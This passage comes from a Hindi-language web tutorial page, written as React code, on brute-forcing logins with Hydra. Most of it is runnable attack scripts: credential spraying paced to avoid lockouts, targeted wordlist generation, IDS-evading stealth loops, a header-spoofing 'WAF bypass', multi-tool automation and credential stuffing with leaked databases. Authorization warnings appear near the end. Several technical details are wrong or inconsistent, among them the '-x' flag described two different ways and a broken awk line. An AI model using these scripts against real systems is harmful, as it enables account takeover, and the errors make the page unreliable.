# IPv6 target:
hydra -l admin -P pass.txt ::1 ssh

# DNS brute force (via SSH):
hydra -l admin -P pass.txt -M targets.txt ssh`}
      />

      <h2>Credential Spraying</h2>
      <p>
        क्रेडेंशियल स्प्रेइंग एक एडवांस्ड तकनीक है जहाँ कम पासवर्ड्स को कई यूज़र्स पर ट्राई करते हैं। यह एकाउंट लॉकआउट से बचने का सबसे अच्छा तरीका है।
      </p>
      <CodeBlock
        title="क्रेडेंशियल स्प्रेइंग"
        code={`#!/bin/bash
# क्रेडेंशियल स्प्रेइंग — लॉकआउट से बचो

# कॉमन पासवर्ड्स (कम संख्या में):
COMMON_PASSES="Password1
Summer2024
Welcome1
Company@123
Admin@2024"

# यूज़र्स लिस्ट (ज़्यादा):
USERS="users.txt"  # 100+ यूज़र्स

# हर पासवर्ड को सभी यूज़र्स पर ट्राई करो:
echo "$COMMON_PASSES" | while read pass; do
    echo "[*] पासवर्ड ट्राई: $pass"
    hydra -L $USERS -p "$pass" -t 1 -f target_ip ssh
    sleep 10  # लॉकआउट से बचने के लिए डिले
done

# भारतीय कॉन्टेक्स्ट कॉमन पासवर्ड्स:
# Password@1, Welcome@123, India@2024
# CompanyName@1, Admin@123, Test@1234
# Season+Year: Summer2024, Winter2024, Spring2024`}
      />

      <h2>Wordlist Generation</h2>
      <p>
        ब्रूट फोर्स अटैक की सफलता 90% वर्डलिस्ट क्वालिटी पर डिपेंड करती है।
      </p>
      <CodeBlock
        title="वर्डलिस्ट जनरेशन"
        code={`# Crunch से कस्टम वर्डलिस्ट बनाओ:
# 8 कैरेक्टर, lowercase + numbers:
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# पैटर्न-बेस्ड (जैसे: admin2024):
crunch 10 10 -t admin@@@@ -o admin_pass.txt
# @ = lowercase, , = uppercase, % = numbers, ^ = symbols

# CeWL से वेबसाइट से वर्डलिस्ट बनाओ:
cewl https://target.com -d 2 -m 5 -w target_words.txt

# Username जनरेशन (नाम से):
# john, admin, root, test, guest, user, administrator
# कंपनी नेम + variations: company, company123, Company@2024

# Crunch से डेट बेस्ड पासवर्ड्स:
crunch 8 8 -t @@@@2024 -o date_based.txt
crunch 10 10 -t @@@@@@1234 -o common_suffix.txt

# Hashcat रूल्स से वर्डलिस्ट बढ़ाओ:
hashcat -r /usr/share/hashcat/rules/best64.rule wordlist.txt --stdout > expanded.txt

# भारतीय कॉन्टेक्स्ट वर्डलिस्ट:
# फ़ोन नंबर पैटर्न: 98XXXXXXXX, 99XXXXXXXX
# नाम + साल: rahul1990, priya2024, amit@123
# कंपनी + क्रेडेंशियल्स: tcs123, infosys@2024`}
      />

      <h2>Protocol-Specific Attack Details</h2>
      <h3>SSH Attack Details</h3>
      <p>
        SSH सबसे कॉमन टार्गेट है। SSH मॉड्यूल कई वर्जन्स सपोर्ट करता है।
      </p>
      <CodeBlock
        title="SSH एडवांस्ड अटैक"
        code={`# SSH वर्जन डिटेक्ट करो:
nmap -sV -p 22 target_ip

# SSH की-बेस्ड ऑथ चेक (पासवर्ड डिसेबल है?):
ssh -o PreferredAuthentications=none target_ip 2>&1 | grep "auth"

# SSH बैनर ग्रैब:
nc -v target_ip 22

# SSH हनीपॉट डिटेक्ट (Cowrie, Kippo):
# हनीपॉट्स अक्सर डिफ़ॉल्ट क्रेडेंशियल्स एक्सेप्ट करते हैं
# अगर "admin:admin" काम कर जाए तो हनीपॉट हो सकता है

# SSH बैनर से OS डिटेक्ट:
# SSH-2.0-OpenSSH_8.2p1 Ubuntu — Ubuntu सर्वर
# SSH-2.0-OpenSSH_7.4 — CentOS/RHEL
# SSH-2.0-dropbear — एम्बेडेड डिवाइस`}
      />

      <h3>HTTP Form Attack Details</h3>
      <CodeBlock
        title="HTTP एडवांस्ड अटैक"
        code={`# फॉर्म फील्ड्स कैसे पता करें:
# 1. Browser में website खोलें और DevTools (F12) open करें
# 2. Network tab पर जाएं
# 3. गलत password से login try करें
# 4. POST request देखें — form fields और error message note करें

# CSRF टोकन वाले फॉर्म्स:
# Hydra CSRF handle नहीं करता — Python स्क्रिप्ट लिखो
import requests
from bs4 import BeautifulSoup

session = requests.Session()
response = session.get("http://target.com/login")
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf_token'})['value']

# CAPTCHA वाले फॉर्म्स:
# Hydra CAPTCHA handle नहीं करता
# anti-captcha services यूज़ करो या मैनुअली

# मल्टी-स्टेप लॉगिन:
# Step 1: username डालो
# Step 2: password डालो
# Hydra सिर्फ़ सिंगल-स्टेप सपोर्ट करता है
# मल्टी-स्टेप के लिए Python स्क्रिप्ट लिखो`}
      />

      <h2>Real-World Scenarios</h2>
      <div className="space-y-3 mt-4">
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 1: कॉर्पोरेट नेटवर्क ऑडिट</h4>
          <p className="text-gray-400 text-sm">
            एक कंपनी के 50 सर्वर्स पर SSH ब्रूट फोर्स करना है। पहले Nmap से सभी ओपन SSH पोर्ट्स खोजो, फिर Hydra से -M फ्लैग से सभी होस्ट्स पर एक साथ अटैक करो। कॉमन यूज़रनेम्स (admin, root, test) और डिफ़ॉल्ट पासवर्ड्स ट्राई करो। रिजल्ट्स को CSV में सेव करो।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 2: वेब एप्लिकेशन टेस्टिंग</h4>
          <p className="text-gray-400 text-sm">
            वेब एप्लिकेशन के एडमिन पैनल (/admin, /wp-admin) पर HTTP बेसिक ऑथ ब्रूट फोर्स। Hydra के http-post-form मॉड्यूल से -m DIR:/admin ऑप्शन यूज़ करो। वर्डलिस्ट में कॉमन एडमिन पासवर्ड्स रखो: admin, password123, admin@2024।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 3: IoT डिवाइस टेस्टिंग</h4>
          <p className="text-gray-400 text-sm">
            IoT डिवाइसेज (राउटर्स, कैमरा, NAS) पर डिफ़ॉल्ट क्रेडेंशियल्स चेक करना। Telnet (पोर्ट 23) और SSH (पोर्ट 22) पर Hydra यूज़ करो। डिफ़ॉल्ट क्रेडेंशियल्स: admin:admin, root:root, admin:1234, user:user।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 4: डेटाबेस सिक्योरिटी ऑडिट</h4>
          <p className="text-gray-400 text-sm">
            MySQL, PostgreSQL, MSSQL डेटाबेस सर्वर्स पर डिफ़ॉल्ट क्रेडेंशियल्स चेक करना। root:root, sa:sa, postgres:postgres जैसे डिफ़ॉल्ट्स ट्राई करो। कस्टम यूज़रनेम लिस्ट बनाओ जिसमें dba, database, admin शामिल हों।
          </p>
        </div>
      </div>

      <h2>Stealth Techniques</h2>
      <p>
        अगर टार्गेट पर IDS/IPS है तो स्टील्दी तरीके से अटैक करना ज़रूरी है।
      </p>
      <CodeBlock
        title="स्टील्दी अटैक तकनीकें"
        code={`# धीमा अटैक (1 थ्रेड, डिले के साथ):
hydra -l admin -P passwords.txt -t 1 -w 10 target_ip ssh

# होस्ट्स को रोटेट करो:
#!/bin/bash
for ip in $(shuf -n 10 hosts.txt); do
    hydra -l admin -P passwords.txt -t 1 -f $ip ssh
    sleep $((RANDOM % 30 + 10))  # 10-40 सेकंड रैंडम डिले
done

# स्मॉल वर्डलिस्ट (कम अटेम्प्ट्स):
head -100 passwords.txt > small_list.txt
hydra -l admin -P small_list.txt -t 1 target_ip ssh

# कस्टम पोर्ट (डिफ़ॉल्ट पोर्ट से हटकर):
hydra -l admin -P passwords.txt -s 2222 target_ip ssh

# प्रॉक्सी सपोर्ट (IP रोटेशन):
hydra -l admin -P passwords.txt -x 127.0.0.1:8080 target_ip ssh

# कस्टम हेडर्स (WAF बायपास):
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed" -H "X-Forwarded-For: 127.0.0.1"`}
      />

      <h2>Error Handling and Debugging</h2>
      <p>
        Hydra में एरर्स और इश्यूज कैसे हैंडल करें।
      </p>
      <CodeBlock
        title="डीबगिंग"
        code={`# वर्बोज़ मोड (सभी डिटेल्स):
hydra -l admin -P passwords.txt -V target_ip ssh

# कनेक्शन टेस्ट (सिर्फ 1 अटेम्प्ट):
hydra -l admin -p password123 -V target_ip ssh

# कॉमन एरर्स:
# [ERROR] Could not connect to target_ip:22 — कनेक्शन फेल
# → नेटवर्क कनेक्टिविटी चेक करो, फ़ायरवॉल चेक करो

# [ERROR] Invalid form string — HTTP फॉर्म गलत है
# → फॉर्म फील्ड्स और एरर मैसेज सही करो

# [WARNING] Too many connection errors — बहुत ज़्यादा फेल
# → थ्रेड्स कम करो (-t 1), डिले बढ़ाओ (-w 10)

# नेटवर्क डीबग:
# कनेक्टिविटी चेक:
ping -c 3 target_ip
# पोर्ट चेक:
nmap -p 22 target_ip
# फ़ायरवॉल चेक:
sudo iptables -L -n`}
      />

      <h2>Common Mistakes</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'बहुत ज़्यादा थ्रेड्स यूज़ करना', a: '100+ थ्रेड्स से सर्वर क्रैश हो सकता है, फ़ायरवॉल ब्लॉक कर देगा, और एकाउंट लॉक हो जाएगा। 3-10 थ्रेड्स से शुरू करो।' },
          { q: 'गलत वर्डलिस्ट यूज़ करना', a: 'बड़ी वर्डलिस्ट हमेशा बेहतर नहीं होती। कस्टम वर्डलिस्ट बनाओ जो टार्गेट के कॉन्टेक्स्ट से रिलेटेड हो।' },
          { q: 'लॉग नहीं चेक करना', a: 'Hydra का आउटपुट हमेशा सेव करो। बाद में एनालिसिस के लिए ज़रूरी है।' },
          { q: 'डिफ़ॉल्ट क्रेडेंशियल्स भूल जाना', a: 'पहले कॉमन डिफ़ॉल्ट्स ट्राई करो: admin:admin, root:root, test:test। अक्सर यही काम कर जाते हैं।' },
          { q: 'एक ही वर्डलिस्ट सब पर', a: 'हर सर्विस के लिए अलग वर्डलिस्ट बनाओ। SSH के लिए लिनक्स पासवर्ड्स, HTTP के लिए वेब पासवर्ड्स।' },
          { q: 'रेट लिमिटिंग नहीं', a: 'iptables या tc से रेट लिमिट लगाओ। फ़ायरवॉल ब्लॉक से बचो।' },
          { q: 'स्टील्दी नहीं होना', a: 'IPS/IDS डिटेक्ट कर लेगा। थ्रेड्स कम रखो, डिले बढ़ाओ, IP रोटेट करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">❌ {item.q}</h4>
            <p className="text-gray-400 text-sm">✅ {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Integration with Other Tools</h2>
      <p>
        Hydra को दूसरे टूल्स के साथ इंटीग्रेट करके पावरफुल वर्कफ़्लो बना सकते हो।
      </p>
      <CodeBlock
        title="टूल इंटीग्रेशन"
        code={`#!/bin/bash
# Nmap + Hydra वर्कफ़्लो

# Step 1: Nmap से ओपन पोर्ट्स खोजो:
nmap -sS -p 21,22,23,80,445,3306,3389 target_ip -oX scan.xml

# Step 2: ओपन सर्विसेज़ के आधार पर Hydra चलाओ:
if nmap -p 22 target_ip | grep -q "open"; then
    echo "[+] SSH ओपन है — ब्रूट फोर्स शुरू"
    hydra -l admin -P passwords.txt -t 5 -f target_ip ssh
fi

if nmap -p 21 target_ip | grep -q "open"; then
    echo "[+] FTP ओपन है — ब्रूट फोर्स शुरू"
    hydra -l admin -P passwords.txt -t 5 -f target_ip ftp
fi

# Medusa + Hydra कॉम्बो:
# Hydra पहले ट्राई करो, फिर Medusa:
hydra -l admin -P passwords.txt target_ip ssh -t 4 -f 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[*] Hydra से नहीं मिला — Medusa ट्राई करते हैं"
    medusa -h target_ip -u admin -P passwords.txt -M ssh -t 5 -f
fi

# Metasploit + Hydra:
# MSF से सर्विसेज़ एन्यूमरेट करो, फिर Hydra से ब्रूट फोर्स:
msfconsole -x "use auxiliary/scanner/ssh/ssh_version; set RHOSTS target_ip; run; exit"
hydra -l admin -P passwords.txt target_ip ssh`}
      />

      <h2>Reporting and Documentation</h2>
      <p>
        पेनेट्रेशन टेस्टिंग में रिपोर्टिंग बहुत ज़रूरी है।
      </p>
      <CodeBlock
        title="रिपोर्टिंग"
        code={`# Hydra आउटपुट को फाइल में सेव करो:
hydra -l admin -P passwords.txt -o results.txt target_ip ssh 2>&1 | tee hydra_log.txt

# सिर्फ सक्सेसफुल लॉगिन्स:
grep "login:" results.txt > successes.txt

# JSON फॉर्मेट में कन्वर्ट:
cat results.txt | grep "login:" | \\
  awk '{print "{\"host\":\"$1\",\"user\":\"$3\",\"pass\":\"$5\"}"}' | \\
  jq . > results.json

# CSV रिपोर्ट बनाओ:
echo "Host,Username,Password,Service" > report.csv
grep "login:" results.txt | \\
  awk '{print $1","$3","$5","$7}' >> report.csv

# एग्जीक्यूटिव समरी:
echo "=== Hydra ब्रूट फोर्स रिपोर्ट ===" > summary.txt
echo "टार्गेट: target_ip" >> summary.txt
echo "डेट: $(date)" >> summary.txt
echo "सर्विसेज़ टेस्टेड: ssh, ftp, http, smb" >> summary.txt
echo "सक्सेसफुल: $(grep -c login: results.txt)" >> summary.txt`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या Hydra free है?', a: 'हाँ, पूरी तरह free और open source (AGPL license)। Commercial use भी free।' },
          { q: 'कितना fast है?', a: 'Protocol पर depend करता है। SSH: ~1000 attempts/sec (16 threads)। HTTP: ~5000 attempts/sec। Network latency matter करती है।' },
          { q: 'Online या offline attack?', a: 'Hydra online attack करता है — directly service पर login try करता है। Offline cracking (hash crack) के लिए John या Hashcat use करो।' },
          { q: 'CAPTCHA bypass कर सकता है?', a: 'नहीं, Hydra CAPTCHA handle नहीं करता। CAPTCHA bypass के लिए separate tools (anti-captcha services) चाहिए।' },
          { q: 'कितने protocols support करता है?', a: '50+ protocols — SSH, FTP, HTTP, SMB, RDP, MySQL, PostgreSQL, Telnet, SMTP, POP3, IMAP, VNC, SNMP, LDAP, और बहुत कुछ।' },
          { q: 'Session resume कैसे करें?', a: 'Attack interrupt होने पर hydra -R run करो — previous session automatically resume होगा।' },
          { q: 'Proxy support है?', a: 'हाँ, HTTP और SOCKS proxy support है। -x flag से proxy set कर सकते हो।' },
          { q: 'GUI version है?', a: 'हाँ, hydra-gtk package install करो। लेकिन CLI version ज़्यादा powerful और flexible है।' },
          { q: 'Medusa vs Hydra कौन सा बेहतर है?', a: 'दोनों का अपना यूज़ केस है। Hydra ज़्यादा प्रोटोकॉल्स सपोर्ट करता है और स्टेबल है। Medusa मल्टी-होस्ट स्कैनिंग में तेज़ है। सिंगल होस्ट के लिए Hydra, कई होस्ट्स के लिए Medusa।' },
          { q: 'Credential stuffing क्या है?', a: 'लीक्ड डेटाबेस से मिले username:password पेयर्स को दूसरे सर्विसेज़ पर ट्राई करना। Hydra में -C combo.txt से कर सकते हो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Tool</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Medusa</td><td className="py-2 px-3">Network brute force</td><td className="py-2 px-3">Modular, parallel, fast</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Ncrack</td><td className="py-2 px-3">Network auth cracker</td><td className="py-2 px-3">Nmap team, clean syntax</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Patator</td><td className="py-2 px-3">Multi-purpose brute force</td><td className="py-2 px-3">Python, flexible, modular</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">John the Ripper</td><td className="py-2 px-3">Offline password cracking</td><td className="py-2 px-3">Hash cracking, rule-based</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Hashcat</td><td className="py-2 px-3">GPU password cracking</td><td className="py-2 px-3">Fastest offline cracking</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="mt-2 text-gray-400 text-sm space-y-1">
          <li>• हमेशा good wordlist use करो — rockyou.txt default, SecLists comprehensive</li>
          <li>• -f flag use करो — first match पर stop हो जाएगा, time बचेगा</li>
          <li>• Account lockout policy पहले check करो — बिना सोचे brute force मत करो</li>
          <li>• -R flag से interrupted session resume कर सकते हो</li>
          <li>• HTTP form attack में error message carefully set करो — गलत होने पर false results आएंगे</li>
          <li>• Stealth के लिए -t 1 -w 10 use करो — slow but less detectable</li>
          <li>• Combo file (-C) credential stuffing के लिए best है — leaked databases से</li>
          <li>• -x flag से password generate कर सकते हो — wordlist की ज़रूरत नहीं</li>
          <li>• SSH के लिए -m SSH_VERSION:2 फ्लैग से SSHv2 फोर्स करो — ज़्यादा सिक्योर है</li>
          <li>• SMB अटैक में -m DOMAIN:WORKGROUP से डोमेन ऑथेंटिकेशन ट्राई करो — डोमेन एडमिन मिल सकता है</li>
          <li>• रिजल्ट्स हमेशा सेव करो — बाद में रिपोर्टिंग और एनालिसिस के लिए ज़रूरी है</li>
          <li>• हमेशा लैब एनवायरनमेंट में प्रैक्टिस करो पहले — Metasploitable2 और DVWA सबसे अच्छे हैं</li>
          <li>• कॉमन डिफ़ॉल्ट्स पहले ट्राई करो: admin:admin, root:root, test:test — अक्सर यही काम कर जाते हैं</li>
          <li>• भारतीय कॉन्टेक्स्ट पासवर्ड्स: CompanyName@1, India@2024, Welcome@123 — कॉमन हैं</li>
          <li>• HTTP फॉर्म अटैक में F= और S= फ्लैग्स ध्यान से सेट करो — गलत होने पर false positives आएंगे</li>
          <li>• -v फ्लैग से वर्बोज़ मोड यूज़ करो — हर अटेम्प्ट दिखेगा, डीबगिंग के लिए उपयोगी</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Hydra एक powerful brute force tool है। इसका इस्तेमाल केवल authorized penetration testing और अपने systems पर ही करें। Brute force attacks सबसे easily detectable attacks हैं — logs में सब दिखता है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized access attempt अपराध है। केवल अपने lab या written permission के साथ ही use करें। सभी रिजल्ट्स को एन्क्रिप्टेड रखो और अधिकृत लोगों के साथ ही शेयर करो।
      </div>

      <div className="info-box mt-6">
        <strong>💡 अगला कदम:</strong> Hydra से ब्रूट फोर्स सीखने के बाद{' '}
        <Link to="/tool/john" className="text-neon-green underline">John the Ripper</Link> सेक्शन में जाएं
        और ऑफ़लाइन पासवर्ड क्रैकिंग सीखें! Hydra से मिली क्रेडेंशियल्स का इस्तेमाल आगे के अटैक्स में करो।
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ इम्पोर्टेन्ट रिमाइंडर:</strong> Hydra का इस्तेमाल हमेशा अधिकृत परमिशन के साथ करो। बिना परमिशन के ब्रूट फोर्स अवैध है। भारत में आईटी एक्ट 2000 के तहत सज़ा हो सकती है। हमेशा लैब एनवायरनमेंट में प्रैक्टिस करो। Hydra के साथ Medusa, John the Ripper, और दूसरे टूल्स भी सीखो — पूरा पेनेट्रेशन टेस्टिंग वर्कफ़्लो समझो। Hydra एक बहुत ही पावरफुल टूल है लेकिन इसका ज़िम्मेदारी से इस्तेमाल करो। हमेशा एथिकल हैकिंग के नियमों का पालन करो। सभी रिजल्ट्स को एन्क्रिप्टेड रखो और अधिकृत लोगों के साथ ही शेयर करो।
      </div>

      <div className="info-box mt-6">
        <strong>💡 एक्स्ट्रा टिप्स:</strong>
        <ul className="mt-2 text-gray-400 text-sm space-y-1">
          <li>• Credential stuffing के लिए -C combo.txt use करो — leaked databases से</li>
          <li>• Password generation के लिए -x flag use करो — wordlist की ज़रूरत नहीं</li>
          <li>• Session resume के लिए -R flag use करो — interrupted attacks continue करो</li>
          <li>• Stealth के लिए -t 1 -w 10 use करो — slow but less detectable</li>
          <li>• भारतीय कॉन्टेक्स्ट पासवर्ड्स: CompanyName@1, India@2024, Welcome@123 — कॉमन हैं</li>
          <li>• HTTP फॉर्म अटैक में F= और S= फ्लैग्स ध्यान से सेट करो — गलत होने पर false positives आएंगे</li>
        </ul>
      </div>
    </TutorialLayout>
  )
}
